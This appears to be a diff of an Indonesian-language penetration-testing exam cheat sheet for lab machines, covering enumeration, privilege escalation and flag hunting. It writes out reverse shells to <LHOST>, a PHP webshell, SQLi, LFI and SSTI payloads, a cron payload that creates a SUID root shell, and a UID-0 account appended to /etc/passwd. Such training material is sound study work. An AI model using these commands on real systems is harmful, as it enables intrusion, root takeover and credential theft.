 find / -perm -4000 -type f 2>/dev/null
 ```
 
-SGID:
+## 14.5 SGID
 
 ```bash
 find / -perm -2000 -type f 2>/dev/null
 ```
 
-Prioritaskan binary tidak lazim pada:
+Prioritaskan binary tidak biasa:
 
 ```text
 /usr/local/bin
@@ -916,32 +1015,15 @@ Prioritaskan binary tidak lazim pada:
 /tmp
 ```
 
-Binary umum yang perlu dicek di GTFOBins:
-
-```text
-find
-vim
-less
-awk
-env
-python
-perl
-bash
-tar
-nano
-cp
-dd
-```
-
 ---
 
-## 7.6 Linux Capabilities
+## 14.6 Capabilities
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-Temuan bernilai tinggi:
+Temuan penting:
 
 ```text
 cap_setuid
@@ -950,17 +1032,9 @@ cap_dac_override
 cap_sys_admin
 ```
 
-Contoh pola berbahaya:
-
-```text
-/usr/bin/python3 cap_setuid=ep
-```
-
-Verifikasi di GTFOBins berdasarkan binary dan capability.
-
 ---
 
-## 7.7 Cron Jobs
+## 14.7 Cron
 
 ```bash
 cat /etc/crontab
@@ -970,23 +1044,24 @@ cat /etc/cron.d/*
 
 Periksa:
 
-- job dijalankan sebagai root;
-- script yang dipanggil;
-- permission script;
-- permission direktori;
-- command tanpa full path;
+```text
+- dijalankan sebagai root;
+- script writable;
+- direktori writable;
+- command tanpa absolute path;
 - wildcard;
-- file konfigurasi yang writable.
+- environment PATH.
+```
 
 ---
 
-## 7.8 Writable Files
+## 14.8 Writable files
 
 ```bash
 find / -writable -type f 2>/dev/null | grep -v proc
 ```
 
-Untuk file tertentu:
+Cek target tertentu:
 
 ```bash
 ls -la <FILE>
@@ -994,15 +1069,16 @@ stat <FILE>
 namei -l <FILE>
 ```
 
-`namei -l` penting untuk mengecek permission pada seluruh komponen path.
-
 ---
 
-## 7.9 Credential Hunting
+## 14.9 Credential hunting
 
 ```bash
 ls -la /home/*
 cat ~/.bash_history
+```
+
+```bash
 find / -name "*.conf" 2>/dev/null
 find / -name "*.ini" 2>/dev/null
 find / -name "*.env" 2>/dev/null
@@ -1017,7 +1093,7 @@ grep -RniE \
   /var/www /opt /home 2>/dev/null
 ```
 
-SSH keys:
+Cari private key:
 
 ```bash
 find /home -name id_rsa -o -name authorized_keys 2>/dev/null
@@ -1025,7 +1101,7 @@ find /home -name id_rsa -o -name authorized_keys 2>/dev/null
 
 ---
 
-## 7.10 Internal Services
+## 14.10 Internal services
 
 ```bash
 ss -tlnp
@@ -1037,7 +1113,7 @@ Alternatif:
 netstat -tulnp 2>/dev/null
 ```
 
-Service yang hanya listen di localhost dapat menjadi jalur pivot:
+Service localhost bernilai tinggi:
 
 ```text
 127.0.0.1:3306
@@ -1048,9 +1124,19 @@ Service yang hanya listen di localhost dapat menjadi jalur pivot:
 
 ---
 
-## 7.11 LinPEAS
+## 14.11 Process
 
-### Transfer dari Kali
+```bash
+ps aux
+```
+
+```bash
+ps aux | grep root
+```
+
+---
+
+## 14.12 LinPEAS
 
 Di Kali:
 
@@ -1061,77 +1147,53 @@ python3 -m http.server 8089
 Di target:
 
 ```bash
-wget \
-  http://<LHOST>:8089/linpeas.sh \
-  -O /tmp/linpeas.sh
-
+wget http://<LHOST>:8089/linpeas.sh -O /tmp/linpeas.sh
 chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh | tee /tmp/linpeas-output.txt
 ```
 
-Alternatif langsung:
+One-liner:
 
 ```bash
-curl http://<LHOST>:8089/linpeas.sh | sh
+chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas-output.txt
 ```
 
-### Cara membaca hasil
-
-Prioritaskan:
-
-1. sudo;
-2. SUID;
-3. capabilities;
-4. cron/script writable;
-5. credential;
-6. service lokal;
-7. kernel;
-8. file sensitif readable/writable.
-
-> Jangan menganggap semua teks merah berarti pasti exploitable. Konfirmasi manual.
-
----
-
-## 7.12 Checklist Enumeration
+Prioritas membaca output:
 
 ```text
-[ ] id dan group
-[ ] sudo -l
-[ ] OS dan kernel
-[ ] SUID
-[ ] SGID
-[ ] capabilities
-[ ] cron
-[ ] file writable
-[ ] credential dan history
-[ ] SSH key
-[ ] service internal
-[ ] LinPEAS
-[ ] setiap temuan dikonfirmasi manual
+1. sudo
+2. SUID
+3. capabilities
+4. cron/script writable
+5. credential
+6. internal service
+7. sensitive file
+8. kernel
 ```
+
+> LinPEAS membantu menemukan kandidat. Temuan tetap harus dikonfirmasi manual.
 
 ---
 
-# 8. Fase 5 — Privilege Escalation
+# 15. Tahap 9 — Privilege Escalation
 
-## 8.1 Prioritas Jalur
-
-Gunakan urutan yang paling aman dan sederhana:
+Urutan prioritas:
 
 ```text
 1. Credential reuse
 2. sudo misconfiguration
-3. SUID/capabilities
-4. Writable cron atau service script
-5. Weak file permission
-6. Kernel exploit
+3. SUID
+4. capabilities
+5. writable cron/service
+6. weak file permission
+7. kernel exploit
 ```
 
-Kernel exploit sebaiknya menjadi pilihan terakhir karena risiko crash dan ketergantungan versi/patch.
+Kernel exploit diletakkan terakhir karena berisiko dan bergantung patch.
 
 ---
 
-## 8.2 Sudo Misconfiguration
+# 16. PrivEsc melalui Sudo
 
 Cek:
 
@@ -1139,7 +1201,7 @@ Cek:
 sudo -l
 ```
 
-Contoh pola:
+## Contoh umum
 
 ```bash
 sudo env /bin/sh
@@ -1152,8 +1214,6 @@ sudo find . -exec /bin/sh \; -quit
 ```bash
 sudo python3 -c 'import os;os.system("/bin/sh")'
 ```
-
-Vim:
 
 ```bash
 sudo vim -c ':!/bin/sh'
@@ -1171,17 +1231,15 @@ Di dalam `less`:
 !/bin/sh
 ```
 
-Setelah shell:
+Verifikasi:
 
 ```bash
 id
 ```
 
-> Untuk setiap binary dari `sudo -l`, cari nama binary di GTFOBins dan gunakan bagian **Sudo**.
-
 ---
 
-## 8.3 SUID
+# 17. PrivEsc melalui SUID
 
 Cari:
 
@@ -1189,18 +1247,29 @@ Cari:
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-Pola umum:
+Contoh:
 
 ```bash
 env /bin/sh -p
+```
+
+```bash
 bash -p
+```
+
+```bash
 find . -exec /bin/sh -p \; -quit
+```
+
+```bash
 awk 'BEGIN{system("/bin/sh")}'
 ```
 
-### Mengapa `-p` penting?
+## Ingat
 
-`-p` mempertahankan effective UID. Tanpanya, shell dapat menurunkan privilege.
+```text
+SUID shell → gunakan -p
+```
 
 Verifikasi:
 
@@ -1208,21 +1277,21 @@ Verifikasi:
 id
 ```
 
-Hasil yang dapat diterima:
-
-```text
-uid=<USER> euid=0(root)
-```
-
-atau:
+Target:
 
 ```text
 uid=0(root)
 ```
 
+atau:
+
+```text
+euid=0(root)
+```
+
 ---
 
-## 8.4 Capabilities
+# 18. PrivEsc melalui Capabilities
 
 Cek:
 
@@ -1230,7 +1299,7 @@ Cek:
 getcap -r / 2>/dev/null
 ```
 
-Contoh jika Python mempunyai `cap_setuid=ep`:
+Contoh Python dengan `cap_setuid=ep`:
 
 ```bash
 python3 -c 'import os;os.setuid(0);os.execl("/bin/bash","bash","-p")'
@@ -1244,9 +1313,9 @@ id
 
 ---
 
-## 8.5 Writable Cron
+# 19. PrivEsc melalui Writable Cron
 
-### Identifikasi
+## 19.1 Temukan job
 
 ```bash
 cat /etc/crontab
@@ -1254,124 +1323,95 @@ ls -la /etc/cron.d/
 cat /etc/cron.d/*
 ```
 
-Cek script:
+## 19.2 Cek permission script
 
 ```bash
 ls -la /path/to/script.sh
 stat /path/to/script.sh
 ```
 
-### Payload SUID Bash
+## 19.3 Tambah payload pada lab
 
 ```bash
-echo \
-  'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' \
-  >> /path/to/script.sh
+echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /path/to/script.sh
 ```
 
 Setelah cron berjalan:
 
 ```bash
 /tmp/rootbash -p
+```
+
+Verifikasi:
+
+```bash
 id
 ```
 
-### Hal yang perlu diperiksa
+## Checklist
 
 ```text
-[ ] Job dijalankan root
-[ ] File script writable oleh user/group kita
-[ ] Direktori tidak mencegah modifikasi
-[ ] Cron benar-benar aktif
-[ ] Script benar-benar dieksekusi
+[ ] Cron dijalankan root
+[ ] Script writable
+[ ] Job benar-benar aktif
+[ ] Payload tidak merusak syntax script
+[ ] /tmp/rootbash terbentuk
 ```
-
-### PATH Hijacking
-
-Berpotensi terjadi jika script root memanggil command tanpa full path:
-
-```bash
-tar
-cp
-backup
-```
-
-dan environment `PATH` mengarah lebih dahulu ke direktori writable.
 
 ---
 
-## 8.6 Weak File Permission
+# 20. Weak File Permission
 
-### File sensitif
+## 20.1 Cek file sensitif
 
 ```bash
-ls -la \
-  /etc/passwd \
-  /etc/shadow \
-  /etc/sudoers \
-  /etc/sudoers.d/
+ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/
 ```
 
-### `/etc/passwd` writable
+## 20.2 SSH private key
 
-Generate password hash:
+```bash
+cat /home/<USER>/.ssh/id_rsa
+```
+
+Di Kali:
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa <USER>@"$TARGET"
+```
+
+## 20.3 `/etc/passwd` writable pada lab
+
+Generate hash:
 
 ```bash
 openssl passwd -1 pass123
 ```
 
-Tambahkan akun UID 0 hanya pada lab yang diizinkan:
+Tambah user UID 0:
 
 ```bash
-echo \
-  'labroot:<HASH>:0:0:root:/root:/bin/bash' \
-  >> /etc/passwd
+echo 'labroot:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
 ```
 
 Login:
 
 ```bash
 su labroot
+```
+
+Verifikasi:
+
+```bash
 id
-```
-
-### `/etc/shadow` readable
-
-Salin hash dan lakukan cracking **offline** dengan John atau Hashcat sesuai jenis hash.
-
-### `/etc/sudoers.d/` writable
-
-Konsep salah konfigurasi:
-
-```text
-<USER> ALL=(ALL) NOPASSWD: ALL
-```
-
-Setelah konfigurasi valid:
-
-```bash
-sudo -i
-id
-```
-
-### SSH private key readable
-
-```bash
-cat /home/<USER>/.ssh/id_rsa
-```
-
-Simpan di Kali:
-
-```bash
-chmod 600 id_rsa
-ssh -i id_rsa <USER>@<TARGET>
 ```
 
 ---
 
-## 8.7 Kernel Local Privilege Escalation
+# 21. Kernel Privilege Escalation
 
-### Pemeriksaan awal
+## Cek versi
 
 ```bash
 uname -r
@@ -1384,77 +1424,67 @@ Cari kandidat:
 searchsploit linux kernel <VERSION>
 ```
 
-Linux Exploit Suggester dapat membantu menyusun kandidat berdasarkan versi kernel.
-
-### Aturan penting
+Aturan:
 
 ```text
-1. Jangan hanya mencocokkan nomor kernel.
-2. Periksa distribusi dan patch/backport.
-3. Baca source exploit sebelum compile.
-4. Gunakan PoC dari sumber tepercaya.
-5. Compile di target jika memungkinkan.
-6. Kernel exploit adalah pilihan terakhir.
-7. Siapkan snapshot lab.
+[ ] Cocokkan kernel
+[ ] Cocokkan distro
+[ ] Cek patch/backport
+[ ] Baca source PoC
+[ ] Gunakan sumber tepercaya
+[ ] Snapshot lab
+[ ] Kernel exploit pilihan terakhir
 ```
-
-Repositori sumber mencantumkan contoh CVE modern dan exploit kernel. Karena status kerentanan dapat berubah serta distribusi dapat melakukan backport patch, **selalu verifikasi CVE, versi paket, dan advisori vendor sebelum menjalankannya**.
 
 ---
 
-## 8.8 Decision Tree Privilege Escalation
+# 22. Decision Tree PrivEsc
 
 ```text
-sudo -l menghasilkan binary?
-├─ Ya → cek GTFOBins/Sudo → exploit → id
+sudo -l ada entry?
+├─ Ya → GTFOBins Sudo → exploit → id
 └─ Tidak
    │
-   ├─ Ada SUID tidak lazim?
-   │  ├─ Ya → cek GTFOBins/SUID → gunakan -p → id
+   ├─ SUID tidak biasa?
+   │  ├─ Ya → GTFOBins SUID → shell -p → id
    │  └─ Tidak
    │
-   ├─ Ada capability berbahaya?
-   │  ├─ Ya → cek GTFOBins/Capabilities → id
+   ├─ Capability berbahaya?
+   │  ├─ Ya → payload capability → id
    │  └─ Tidak
    │
-   ├─ Ada cron root?
-   │  ├─ Script writable → inject payload → tunggu → id
-   │  ├─ PATH hijack → buat binary palsu → id
-   │  └─ Tidak writable → lanjut
+   ├─ Cron root?
+   │  ├─ Script writable → inject → tunggu → id
+   │  ├─ PATH hijack → konfirmasi → id
+   │  └─ Tidak
    │
-   ├─ Ada credential/key?
-   │  ├─ Ya → su/ssh → enum ulang sebagai user baru
+   ├─ Credential/key ditemukan?
+   │  ├─ Ya → su/ssh → enum ulang
    │  └─ Tidak
    │
    ├─ File sensitif writable/readable?
-   │  ├─ Ya → eksploit sesuai file → id
+   │  ├─ Ya → gunakan sesuai temuan → id
    │  └─ Tidak
    │
-   └─ Kernel vulnerable?
-      ├─ Terkonfirmasi → snapshot → exploit → id
-      └─ Tidak → ulangi enum lebih dalam
+   └─ Kernel rentan dan terkonfirmasi?
+      ├─ Ya → snapshot → exploit → id
+      └─ Tidak → ulangi enumeration
 ```
 
 ---
 
-# 9. Fase 6 — Proof dan Submission
+# 23. Tahap 10 — Verifikasi Root
 
-## 9.1 Bukti minimal
+Jalankan:
 
 ```bash
 id
-hostname
-```
-
-Idealnya tambahkan:
-
-```bash
 whoami
+hostname
 pwd
-date
 ```
 
-### Output yang dicari
+Target:
 
 ```text
 uid=0(root)
@@ -1466,512 +1496,757 @@ atau:
 euid=0(root)
 ```
 
-dan nama host target.
+## Command ringkas
 
-## 9.2 Dokumentasi
-
-Simpan:
-
-```text
-1. Command yang digunakan
-2. Output command
-3. Screenshot terminal
-4. IP target
-5. Hostname
-6. User awal
-7. Jalur privilege escalation
-8. Bukti root
+```bash
+id; whoami; hostname; pwd
 ```
-
-## 9.3 Jangan lupa
-
-- jangan menampilkan terminal Kali saja;
-- pastikan hostname terlihat;
-- pastikan output `id` tidak terpotong;
-- dokumentasikan user sebelum dan sesudah escalation;
-- jangan menghapus bukti sebelum submission.
 
 ---
 
-# 10. End-to-End Workflow untuk Ujian
+# 24. Tahap 11 — Menemukan FLAG
 
-## 10.1 Versi Lengkap
+Jangan hanya mencari file bernama `flag.txt`. Nama flag bisa bervariasi.
+
+## 24.1 Cek lokasi umum
+
+```bash
+ls -la /root
+ls -la /home
+ls -la /home/*
+ls -la /var/www
+ls -la /opt
+ls -la /tmp
+```
+
+## 24.2 Cari berdasarkan nama
+
+```bash
+find / -type f -iname "flag*" 2>/dev/null
+```
+
+```bash
+find / -type f \( -iname "*flag*" -o -iname "proof.txt" -o -iname "root.txt" -o -iname "user.txt" \) 2>/dev/null
+```
+
+## 24.3 Cari pola umum CTF
+
+```bash
+grep -RniE \
+  'flag\{|FLAG\{|THM\{|HTB\{|CTF\{' \
+  /root /home /var/www /opt 2>/dev/null
+```
+
+## 24.4 Cari file teks kecil
+
+```bash
+find /root /home /var/www /opt \
+  -type f \
+  -size -10k \
+  2>/dev/null
+```
+
+## 24.5 Tampilkan isi flag
+
+```bash
+cat /root/root.txt
+```
+
+```bash
+cat /home/<USER>/user.txt
+```
+
+```bash
+cat <PATH_FLAG>
+```
+
+## 24.6 Jika tidak tahu format
+
+```bash
+file <PATH>
+strings <PATH>
+```
+
+## Urutan pencarian flag
+
+```text
+1. /root
+2. /home/*
+3. /var/www
+4. /opt
+5. find berdasarkan nama
+6. grep pola FLAG
+```
+
+## Wajib hafal
+
+```bash
+find / -type f -iname "flag*" 2>/dev/null
+```
+
+```bash
+find / -type f \( -iname "*flag*" -o -iname "proof.txt" -o -iname "root.txt" -o -iname "user.txt" \) 2>/dev/null
+```
+
+---
+
+# 25. Tahap 12 — Proof / Submission
+
+## Bukti minimum
+
+```bash
+id
+hostname
+cat <PATH_FLAG>
+```
+
+## Bukti lebih lengkap
+
+```bash
+id
+whoami
+hostname
+pwd
+date
+ls -la <PATH_FLAG>
+cat <PATH_FLAG>
+```
+
+## Screenshot harus memuat
+
+```text
+[ ] uid/euid root
+[ ] hostname target
+[ ] lokasi flag
+[ ] isi flag
+[ ] terminal tidak terpotong
+```
+
+---
+
+# 26. End-to-End Command Flow
 
 ```bash
 # =========================================================
-# 1. DISCOVER
+# 1. VARIABLES
 # =========================================================
-sudo netdiscover -r 192.168.56.0/24
+TARGET="192.168.56.118"
+LHOST="192.168.56.101"
+PORT="8080"
+BASE="http://$TARGET:$PORT"
+
+# =========================================================
+# 2. DISCOVER
+# =========================================================
+ip a
 nmap -sn 192.168.56.0/24
-hostname -I
 
 # =========================================================
-# 2. SCAN
+# 3. SCAN
 # =========================================================
-nmap -p- --min-rate 5000 -T4 <TARGET> -oN all-ports.txt
-nmap -sC -sV -p<PORTS> <TARGET> -oN service-scan.txt
+nmap -p- --min-rate 5000 -T4 "$TARGET" -oN all-ports.txt
+nmap -sC -sV -p22,80,8080 "$TARGET" -oN service-scan.txt
 
 # =========================================================
-# 3. WEB ENUM
+# 4. WEB ENUM
 # =========================================================
-dirsearch -u http://<TARGET>:<PORT>/
-feroxbuster \
-  -u http://<TARGET>:<PORT>/ \
-  -w /usr/share/wordlists/dirb/common.txt
+curl -s "$BASE/robots.txt"
+dirsearch -u "$BASE/"
+feroxbuster -u "$BASE/" -w /usr/share/wordlists/dirb/common.txt
 
 # =========================================================
-# 4. TEST FOOTHOLD
+# 5. TEST FOOTHOLD
 # =========================================================
-# SQLi: ' OR '1'='1'-- -
-# LFI:  ../../../../etc/passwd
-# SSTI: {{7*7}}
-# CMDi: ; id
-# Upload: <?php system($_GET['cmd']); ?>
+# SQLi   : ' OR '1'='1'-- -
+# LFI    : ?page=../../../../etc/passwd
+# SSTI   : {{7*7}}
+# CMDi   : ; id
+# Upload : <?php system($_GET['cmd']); ?>
 
 # =========================================================
-# 5. LISTENER
+# 6. SQLMAP EXAMPLE
+# =========================================================
+URL="$BASE/page?id=1"
+sqlmap -u "$URL" -p id --batch
+sqlmap -u "$URL" -p id --batch --current-db
+sqlmap -u "$URL" -p id --batch --dbs
+sqlmap -u "$URL" -p id --batch -D <DATABASE> --tables
+sqlmap -u "$URL" -p id --batch -D <DATABASE> -T <TABLE> --dump
+
+# =========================================================
+# 7. LISTENER
 # =========================================================
 rlwrap nc -lvnp 4444
 
 # =========================================================
-# 6. REVERSE SHELL
+# 8. REVERSE SHELL
 # =========================================================
 bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
 
 # =========================================================
-# 7. STABILIZE
+# 9. TTY
 # =========================================================
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 
 # =========================================================
-# 8. ENUM
+# 10. LOCAL ENUM
 # =========================================================
-id
-sudo -l
-uname -a
-cat /etc/os-release
+id; sudo -l
+uname -a; cat /etc/os-release
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -2000 -type f 2>/dev/null
 getcap -r / 2>/dev/null
-cat /etc/crontab
-ls -la /etc/cron.d/
+cat /etc/crontab; ls -la /etc/cron.d/
 find / -writable -type f 2>/dev/null | grep -v proc
+ls -la /home/*; cat ~/.bash_history
 ss -tlnp
 
 # =========================================================
-# 9. AUTOMATED ENUM
+# 11. PRIVESC
 # =========================================================
-wget http://<LHOST>:8089/linpeas.sh -O /tmp/linpeas.sh
-chmod +x /tmp/linpeas.sh
-/tmp/linpeas.sh | tee /tmp/linpeas-output.txt
+# Priority:
+# credential → sudo → SUID → capability → cron
+# → weak permission → kernel
 
 # =========================================================
-# 10. PRIVESC
+# 12. VERIFY ROOT
 # =========================================================
-# pilih berdasarkan temuan:
-# sudo → SUID → capabilities → cron → weak permission → kernel
+id; whoami; hostname; pwd
 
 # =========================================================
-# 11. PROOF
+# 13. FIND FLAG
+# =========================================================
+ls -la /root /home /home/* /var/www /opt 2>/dev/null
+find / -type f \( -iname "*flag*" -o -iname "proof.txt" -o -iname "root.txt" -o -iname "user.txt" \) 2>/dev/null
+
+# =========================================================
+# 14. PROOF
 # =========================================================
 id
 hostname
+cat <PATH_FLAG>
 ```
 
 ---
 
-## 10.2 Versi Closed-Book 60 Detik
+# 27. Closed-Book 60-Second Recall
 
 ```text
-1. IP:
-   netdiscover / nmap -sn
+1. DISCOVER
+   ip a
+   nmap -sn subnet
 
-2. Port:
-   nmap -sC -sV -p- TARGET
+2. SCAN
+   nmap -p- --min-rate 5000
+   nmap -sC -sV -pPORTS
 
-3. Web:
+3. WEB ENUM
+   robots.txt
    dirsearch / feroxbuster
 
-4. Test:
-   SQLi  = ' OR '1'='1'-- -
-   LFI   = ../../../../etc/passwd
-   SSTI  = {{7*7}}
-   CMDi  = ; id
-   Upload= PHP webshell
+4. FOOTHOLD
+   SQLi   → ' OR '1'='1'-- -
+   LFI    → ../../../../etc/passwd
+   SSTI   → {{7*7}}
+   CMDi   → ; id
+   Upload → PHP webshell
 
-5. Shell:
+5. SQLMAP
+   detect
+   current-db
+   dbs
+   tables
+   dump
+
+6. SHELL
    nc -lvnp 4444
-   bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
+   bash reverse shell
 
-6. Stabil:
-   python3 -c 'import pty;pty.spawn("/bin/bash")'
+7. TTY
+   python pty
 
-7. Enum:
+8. LOCAL ENUM
    id
    sudo -l
-   uname -a
-   find SUID
+   uname
+   SUID
    getcap
    cron
    writable
+   credential
    ss -tlnp
    linpeas
 
-8. Root:
-   GTFOBins / cron / capability / credential / kernel
+9. ROOT
+   sudo / SUID / cap / cron / credential / kernel
 
-9. Bukti:
-   id
-   hostname
+10. FLAG
+    find flag, proof.txt, root.txt, user.txt
+
+11. PROOF
+    id
+    hostname
+    cat flag
 ```
 
 ---
 
-# 11. Matriks Temuan → Tindakan
+# 28. Command Wajib Hafal
 
-| Temuan | Command Konfirmasi | Tindakan Berikutnya |
-|---|---|---|
-| Login form | tangkap POST di Burp | SQLi/default credential |
-| Parameter `id=` | true/false test | SQLMap/manual SQLi |
-| Upload | upload file harmless dahulu | uji extension/MIME/webshell |
-| Parameter `page=` | baca `/etc/passwd` | source disclosure/log poisoning |
-| Input diagnostic | `; id` atau `sleep 5` | reverse shell |
-| Template input | `{{7*7}}` | identifikasi engine/RCE |
-| Shell `www-data` | `id; sudo -l` | local enum |
-| `NOPASSWD` | cek binary | GTFOBins Sudo |
-| SUID custom | `ls -la`, `file`, `strings` | GTFOBins/source review |
-| `cap_setuid` | `getcap` | payload capability |
-| Cron root | permission script/path | writable script/PATH hijack |
-| Credential config | login/su/ssh | enum ulang sebagai user baru |
-| Kernel lama | version + vendor patch | verifikasi CVE/PoC |
-| Root | `id; hostname` | screenshot dan submission |
-
----
-
-# 12. Kesalahan yang Sering Terjadi Saat Ujian
-
-## Recon
-
-- hanya scan port umum, tidak memakai `-p-`;
-- lupa memeriksa port web alternatif;
-- tidak menyimpan hasil scan;
-- wordlist tidak tersedia tetapi tidak mengganti path.
-
-## Foothold
-
-- langsung memakai payload kompleks tanpa deteksi sederhana;
-- tidak menangkap request POST dengan Burp;
-- tidak mencari lokasi file upload;
-- menyimpulkan SQLi hanya dari satu respons;
-- lupa melakukan URL encoding.
-
-## Reverse Shell
-
-- listener belum dijalankan;
-- `LHOST` salah;
-- port listener berbeda;
-- target tidak dapat menjangkau Kali;
-- payload rusak karena karakter `&`, `>`, atau quote.
-
-## Enumeration
-
-- hanya mengandalkan LinPEAS;
-- melewatkan `sudo -l`;
-- tidak mengecek capabilities;
-- hanya melihat file, tidak mengecek permission direktori;
-- tidak melakukan enum ulang setelah berpindah user.
-
-## Privilege Escalation
-
-- menjalankan kernel exploit terlalu cepat;
-- menggunakan `bash` tanpa `-p` pada SUID;
-- melihat cron tetapi tidak mengecek apakah script writable;
-- tidak mengecek GTFOBins untuk setiap binary;
-- tidak memverifikasi root dengan `id`.
-
-## Submission
-
-- screenshot tidak memuat hostname;
-- output `id` menunjukkan user biasa;
-- command dan output terpotong;
-- tidak mencatat jalur eksploitasi.
-
----
-
-# 13. Strategi Waktu Ujian
-
-## Menit 0–15: Recon
-
-```text
-- temukan target;
-- scan seluruh port;
-- identifikasi layanan;
-- mulai directory brute force.
-```
-
-## Menit 15–45: Foothold
-
-```text
-- prioritaskan endpoint login/upload/parameter;
-- uji kerentanan sederhana;
-- kejar command execution;
-- peroleh reverse shell.
-```
-
-## Menit 45–75: Enumeration
-
-```text
-- quick wins manual;
-- LinPEAS;
-- analisis sudo/SUID/capability/cron/credential;
-- pilih jalur termudah.
-```
-
-## Menit 75–105: Privilege Escalation
-
-```text
-- eksekusi jalur prioritas;
-- verifikasi root;
-- siapkan alternatif jika gagal.
-```
-
-## Menit 105–120: Proof
-
-```text
-- id;
-- hostname;
-- screenshot;
-- rapikan catatan;
-- pastikan bukti lengkap.
-```
-
-Sesuaikan dengan durasi ujian. Prinsipnya: jangan menghabiskan seluruh waktu pada satu payload yang tidak terkonfirmasi.
-
----
-
-# 14. Template Catatan Ujian
-
-````markdown
-## Target
-
-- IP:
-- Port:
-- Hostname:
-- OS:
-- Kernel:
-
-## Services
-
-| Port | Service | Version | Notes |
-|---:|---|---|---|
-
-## Web Enumeration
-
-- URL:
-- Endpoint:
-- Parameter:
-- Credential:
-- Upload path:
-
-## Initial Foothold
-
-- Vulnerability:
-- Detection payload:
-- Exploit request:
-- Initial user:
-
-## Reverse Shell
-
-- LHOST:
-- LPORT:
-- Payload:
-- TTY stabilization:
-
-## Privilege Escalation
-
-- Finding:
-- Verification:
-- Exploit:
-- Result:
-
-## Proof
+## Level 1 — Harus spontan
 
 ```bash
-id
-hostname
+ip a
+nmap -sn 192.168.56.0/24
+nmap -sC -sV -p- "$TARGET"
+dirsearch -u "$BASE/"
+nc -lvnp 4444
+bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+id; sudo -l
+uname -a; cat /etc/os-release
+find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+cat /etc/crontab; ls -la /etc/cron.d/
+ss -tlnp
+id; hostname
+find / -type f -iname "flag*" 2>/dev/null
 ```
-````
+
+## Level 2 — Hafal setelah Level 1
+
+```bash
+find / -perm -2000 -type f 2>/dev/null
+find / -writable -type f 2>/dev/null | grep -v proc
+grep -RniE 'password|passwd|secret|token' /var/www /opt /home 2>/dev/null
+wget http://<LHOST>:8089/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas-output.txt
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
+```
+
+## Level 3 — Cukup tahu pola
+
+```text
+- msfvenom variasi payload
+- exploit GTFOBins per binary
+- kernel exploit spesifik
+- payload SSTI spesifik engine
+- variasi bypass upload
+```
 
 ---
 
-# 15. Flashcards Hafalan
+# 29. Flashcards
 
-## Q1 — Command menemukan semua port?
-
-```bash
-nmap -sV -sC -p- <TARGET>
-```
-
-## Q2 — Command directory brute force sederhana?
+## Q1 — Scan seluruh port?
 
 ```bash
-dirsearch -u http://<TARGET>:<PORT>/
+nmap -p- --min-rate 5000 -T4 "$TARGET" -oN all-ports.txt
 ```
 
-## Q3 — Payload auth bypass dasar?
+## Q2 — Scan detail service?
+
+```bash
+nmap -sC -sV -p<PORTS> "$TARGET" -oN service-scan.txt
+```
+
+## Q3 — Directory enumeration?
+
+```bash
+dirsearch -u "$BASE/"
+```
+
+## Q4 — SQLi login dasar?
 
 ```text
 ' OR '1'='1'-- -
 ```
 
-## Q4 — Deteksi LFI?
+## Q5 — SQLMap urutan?
+
+```text
+detect → current-db → dbs → tables → dump
+```
+
+## Q6 — LFI dasar?
 
 ```text
 ?page=../../../../etc/passwd
 ```
 
-## Q5 — Deteksi SSTI?
+## Q7 — SSTI dasar?
 
 ```text
 {{7*7}}
 ```
 
-## Q6 — Deteksi command injection?
+## Q8 — Command injection dasar?
 
 ```text
 ; id
 ```
 
-## Q7 — PHP webshell sederhana?
+## Q9 — PHP webshell?
 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-## Q8 — Listener?
+## Q10 — Listener?
 
 ```bash
 nc -lvnp 4444
 ```
 
-## Q9 — Bash reverse shell?
+## Q11 — Bash reverse shell?
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
 ```
 
-## Q10 — Stabilkan shell?
+## Q12 — Stabilize shell?
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-## Q11 — Cek sudo?
+## Q13 — Cek sudo?
 
 ```bash
 sudo -l
 ```
 
-## Q12 — Cari SUID?
+## Q14 — Cari SUID?
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-## Q13 — Cari capabilities?
+## Q15 — Cari capabilities?
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-## Q14 — Cek cron?
+## Q16 — Cek cron?
 
 ```bash
 cat /etc/crontab
 ls -la /etc/cron.d/
 ```
 
-## Q15 — Bukti root?
+## Q17 — Cari service internal?
+
+```bash
+ss -tlnp
+```
+
+## Q18 — Verifikasi root?
+
+```bash
+id
+```
+
+## Q19 — Cari flag?
+
+```bash
+find / -type f -iname "flag*" 2>/dev/null
+```
+
+## Q20 — Bukti submission?
 
 ```bash
 id
 hostname
+cat <PATH_FLAG>
 ```
 
 ---
 
-# 16. Ringkasan Satu Halaman
+# 30. Strategi Waktu Ujian 120 Menit
+
+## Menit 0–15 — Discover dan Scan
 
 ```text
-R — RECON
-    netdiscover / nmap -sn
-    nmap -sC -sV -p-
-    dirsearch / feroxbuster
+- temukan IP;
+- scan seluruh port;
+- scan versi service;
+- catat semua port.
+```
 
-F — FOOTHOLD
-    SQLi:   ' OR '1'='1'-- -
-    Upload: PHP webshell
-    SSTI:   {{7*7}}
-    LFI:    ../../../../etc/passwd
-    CMDi:   ; id
+## Menit 15–40 — Service/Web Enumeration
 
-S — SHELL
